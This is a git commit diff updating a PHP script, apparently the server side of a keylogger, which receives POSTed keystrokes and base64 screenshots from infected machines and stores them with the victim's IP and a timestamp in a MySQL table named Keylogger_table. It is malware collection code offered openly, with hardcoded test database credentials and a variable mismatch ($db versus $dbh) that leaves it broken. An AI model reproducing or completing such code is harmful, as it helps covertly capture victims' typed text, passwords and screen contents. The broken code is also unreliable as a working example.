027fcff91367f698a66e3d3425f463a25da0d91e
gaten <gaetano.demitri@gmail.com>
2017-10-27 12:44:52 +0200

    Update send.php

--- server/send.php
+++ server/send.php
@@ -1,17 +1,40 @@
 <?php
+$user = "test"; // DB username
+$pass = "test"; // DB password
+$dat = date("Y:m:d H:i:s");
+$ip = $_SERVER['REMOTE_ADDR'];
 
-if(isset($_POST["text"]))
-{
-	$input = $_POST["text"];
-	file_put_contents("data.txt", $input, FILE_APPEND);
+try {
+	$db = new PDO('mysql:host=localhost;dbname=test', $user, $pass); // DB Connection
+	if(isset($_POST["text"]))
+	{
+		$input = $_POST["text"];
+		// Send information
+		$stmt = $dbh->prepare("INSERT INTO Keylogger_table (ip, dat, record) VALUES (:ip, :dat, :record)");
+		$stmt->bindParam(':ip', $ip);
+		$stmt->bindParam(':dat', $dat);
+		$stmt->bindParam(':record', $input);
+		$stmt->execute();
+		//file_put_contents("data.txt", $input, FILE_APPEND);
+	}
+
+	if(isset($_POST["image"]))
+	{
+		$input = $_POST["image"];
+		//$file = fopen(time()."_image.png", 'wb');
+		
+		$blobImage = base64_decode($input);
+		
+		$stmt = $dbh->prepare("INSERT INTO Keylogger_table (ip, dat, screenshot) VALUES (:ip, :dat, :screenshot)");
+		$stmt->bindParam(':ip', $ip);
+		$stmt->bindParam(':dat', $dat);
+		$stmt->bindParam(':screenshot', $blobImage);
+		$stmt->execute();
+	    	//fwrite($file, $input);
+	    	//fclose($file);
+	}
+} catch (PDOException $e) {
+    	print "Error!: " . $e->getMessage() . "<br/>";
+    	die();
 }
-
-if(isset($_POST["image"]))
-{
-	$input = $_POST["image"];
-	$file = fopen(time()."_image.png", 'wb');
-    fwrite($file, $input);
-    fclose($file);
-}
-
 ?>
